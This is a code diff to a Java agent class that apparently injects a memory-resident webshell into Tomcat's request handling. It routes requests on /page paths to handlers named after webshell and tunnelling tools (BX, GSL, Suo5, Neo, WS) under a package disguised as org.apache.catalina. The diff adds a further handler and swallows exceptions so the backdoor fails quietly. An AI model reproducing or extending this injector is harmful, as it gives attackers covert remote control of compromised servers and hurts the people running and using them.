@@ -14,20 +14,25 @@ public class AgentMain {
             "javax.servlet.http.HttpServletRequest request=(javax.servlet.http.HttpServletRequest)$1;\n" +
             "javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)$2;\n" +
             "javax.servlet.http.HttpSession session = request.getSession();\n" +
-            "String url = request.getRequestURI();\n" +
+            "String url = request.getServletPath();\n" +
             "String method = request.getMethod();\n" +
             "java.util.Map obj=new java.util.HashMap();\n" +
             "obj.put(\"request\",request);\n" +
             "obj.put(\"response\",response);\n" +
             "obj.put(\"session\",session);\n" +
             "java.io.InputStream in=request.getInputStream();\n" +
+            "if (url.matches(\"/page(.*)\")) {"+
+            "try{\n" +
             "org.apache.catalina.servlets.sl.C.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.JS.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.BX.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.GSL.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.Suo5.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.Neo.doService(obj,url,method,in);\n"+
-            "org.apache.catalina.servlets.sl.WS.doService(obj,url,method,in);\n";
+            "org.apache.catalina.servlets.sl.WS.doService(obj,url,method,in);\n"+
+            "org.apache.catalina.servlets.sl.LAST.doService(obj,url,method,in);\n"+
+            "return;\n"+
+            "}catch(Exception ignored){}}\n";
 
     public static void agentmain(String agentArgs, Instrumentation ins) {
         System.out.println("I");
